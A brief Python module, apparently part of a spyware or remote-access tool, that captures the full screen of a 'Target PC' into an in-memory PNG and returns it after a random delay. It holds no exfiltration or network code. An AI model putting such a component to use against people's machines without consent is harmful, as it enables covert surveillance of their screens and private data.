# screen.py
from PIL import ImageGrab
import time
import random
import io
from datetime import datetime


# Taking Screenshot From Target PC
# 8/15/2025
# AUX-441


class ScreenShotFile:
    def Scree_Shot(self):
            try:

                """
                    Take Screenshot and return it for later
                    :return: io.BytesIO
                """

                screen = ImageGrab.grab()
                byte = io.BytesIO()
                screen.save(byte,format="PNG")
                byte.seek(0)

                time.sleep(random.randint(1,3))
                print("Succesfully Take screen_shot ...")

                return byte
            except Exception as e:
                print(f"Failed to Get Screenshot : {e}")
                return None

if __name__ == "__main__":
    ScreenShotFile()